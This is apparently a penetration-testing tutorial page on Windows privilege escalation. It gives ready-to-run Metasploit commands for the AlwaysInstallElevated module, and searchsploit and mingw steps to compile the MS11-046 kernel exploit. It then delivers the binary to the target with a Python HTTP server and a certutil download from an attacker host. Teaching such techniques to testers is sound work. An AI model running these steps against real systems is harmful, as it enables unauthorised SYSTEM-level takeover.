---
legal-banner: true
---

### **Exploiting with Metasploit**

1.  We discovered that the target is potentially vulnerable to the following kernel vulnerabilities:  
    
    ![](../../../img/Windows-Environment/15.png)

    **Note:** `exploit/windows/local/always_install_elevated` enables privilege escalation by abusing the AlwaysInstallElevated policy on Windows systems.
    
2.  For this exploit, set the `LHOST`, `LPORT`, and `SESSION` fields.  
    - `SESSION` should be the active Meterpreter session (e.g., 1).  
    - `LPORT` must be different from the port used in the initial session (1338 in this case).  
    
    ```
    use exploit/windows/local/always_install_elevated
    set SESSION 1
    set LHOST [IP-ADDRESS]
    set LPORT [PORT]
    run
    ```
    
    ![](../../../img/Windows-Environment/16.png)
    
3.  Run the exploit to obtain a SYSTEM shell.  
    
    ![](../../../img/Windows-Environment/17.png)
    

### **Exploiting with Windows Exploit Suggester**

1.  Using Windows Exploit Suggester, we identified that the target is potentially vulnerable to several kernel exploits:  
    `python3 wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only`  
    
    ![](../../../img/Windows-Environment/18.png)
    
2.  Download and compile an exploit using `searchsploit`:  
    
    ```
    searchsploit 40564
    searchsploit -m windows_x86/local/40564.c
    x86_64-w64-mingw32-gcc 40564.c -o ms11-046.exe -lws2_32
    ```
    
    ![](../../../img/Windows-Environment/19.png)
    
3.  Alternatively, search for a pre-compiled version of the exploit.  
    
    ![](../../../img/Windows-Environment/20.png)

    **Note:** Be cautious with pre-compiled executables as they may contain backdoors. Always use trusted sources.
    
4.  Example: MS11-046 pre-compiled exploit.  
    
    ![](../../../img/Windows-Environment/21.png)
    
5.  To download, click the **Raw** link for the executable.  
    
    ![](../../../img/Windows-Environment/22.png)
    
6.  Transfer the exploit to the target machine (see File Transfer section for techniques). Example using a Python HTTP server:  
    ```
    python3 -m http.server 8000
    ```
    
    ![](../../../img/Windows-Environment/23.png)
    
7.  Execute the exploit on the target and confirm successful privilege escalation. Example using `certutil`:  
    ```
    certutil -urlcache -f http://[IP-ADDRESS]:8000/ms11-046.exe ms11-046.exe
    ```
    
    ![](../../../img/Windows-Environment/24.png)